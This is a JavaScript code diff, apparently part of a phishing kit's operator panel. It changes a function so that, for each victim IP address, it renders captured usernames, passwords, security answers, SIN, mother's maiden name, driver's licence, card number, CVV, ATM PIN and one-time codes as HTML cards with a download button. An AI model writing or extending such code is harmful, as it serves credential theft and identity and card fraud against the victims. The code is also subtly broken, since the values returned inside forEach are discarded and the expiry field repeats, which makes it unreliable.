@@ -150,17 +150,55 @@ function updateActiveUserCount(newCount) {
   document.getElementById('activeUserCount').textContent = `Active Users: ${newCount}`;
 }
 
-function formatUserDataForDisplay(user) {
+function formatUserDataForDisplay(userData) {
 
-  console.log(`IP Address: ${user.ipAddress}`);
+  userData.forEach(([ipAddress, details]) => {
+   
+      if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {
 
-  console.log(`${user.ipAddress}`);
+         return `   <div class="card">
+               <button id="downloadButton" class="btn btn-secondary mt-2">Download</button>
+  <div class="card-header">
+      IP: ${ipAddress}
+  </div>
+  <ul class="list-group list-group-flush">
+      <li class="list-group-item">Username: ${details.getUserDataLogin.username || ''}</li>
+      <li class="list-group-item">Password: ${details.getUserDataLogin.password || ''}</li>
+      <li class="list-group-item">UserAgent: ${details.getUserDataLogin.userAgent || ''}</li>
+        <li class="list-group-item">----------------------------------------------------------</li>
+        <li class="list-group-item">${details.getUserDataQuestion.question1 || ''} : ${details.getUserDataQuestion.answer1 || ''}</li>
+        <li class="list-group-item">${details.getUserDataQuestion.question2 || ''} : ${details.getUserDataQuestion.answer2 || ''}</li>
+        <li class="list-group-item">${details.getUserDataQuestion.question3 || ''} : ${details.getUserDataQuestion.answer3 || ''}</li>
+        <li class="list-group-item">${details.getUserDataQuestion.question4 || ''} : ${details.getUserDataQuestion.answer4 || ''}</li>
+        <li class="list-group-item">${details.getUserDataQuestion.question5 || ''} : ${details.getUserDataQuestion.answer5 || ''}</li>
+        <li class="list-group-item">${details.getUserDataOTP.customQuestion || ''} : ${details.getUserDataOTP.customAnswer || ''}</li>
+          <li class="list-group-item">----------------------------------------------------------</li>
+      <li class="list-group-item">Full Name: ${details.getUserDataDetails.name || ''}</li>
+      <li class="list-group-item">Address: ${details.getUserDataDetails.address || ''}</li>
+      <li class="list-group-item">City: ${details.getUserDataDetails.city || ''}</li>
+      <li class="list-group-item">Phone Number: ${details.getUserDataDetails.phone || ''}</li>
+      <li class="list-group-item">Postal Code: ${details.getUserDataDetails.postal || ''}</li>
+      <li class="list-group-item">Digit Pin: ${details.getUserDataDetails.pin || ''}</li>
+      <li class="list-group-item">Email: ${details.getUserDataDetails.email || ''}</li>
+      <li class="list-group-item">DOB: ${details.getUserDataDetails.dob1 || ''}/${details.getUserDataDetails.dob2 || ''}/${details.getUserDataDetails.dob3 || ''} || ${details.getUserDataDetails.dob || ''}</li>
+      <li class="list-group-item">Mmn: ${details.getUserDataDetails.mmn || ''}</li>
+      <li class="list-group-item">Sin: ${details.getUserDataDetails.sin || ''}</li>
+      <li class="list-group-item">Driver Licence: ${details.getUserDataDetails.drivers || ''}</li>
+       <li class="list-group-item">----------------------------------------------------------</li>
+       <li class="list-group-item">Card Number: ${details.getUserDataCard.card || ''}</li>
+       <li class="list-group-item">Exp: ${details.getUserDataCard.exp1 || ''}/${details.getUserDataCard.exp1 || ''}</li>
+      <li class="list-group-item">Cvv: ${details.getUserDataCard.cvv || ''}</li>
+      <li class="list-group-item">ATM PIN: ${details.getUserDataCard.atm || ''}</li>
+       <li class="list-group-item">----------------------------------------------------------</li>
+      <li class="list-group-item">OTP: ${details.getUserDataOTP.code || ''}</li>
+  </ul> </div>`;
 
-  Object.entries(user).forEach(([key, value]) => {
-    console.log(`Key: ${key}`)
-    console.log(`Value: ${value}`)
-  });
-
+      } else {
+        return `No result for IP: ${ipAddress}`;
+      }
+    
+  })
+  
   return '';
 }
 
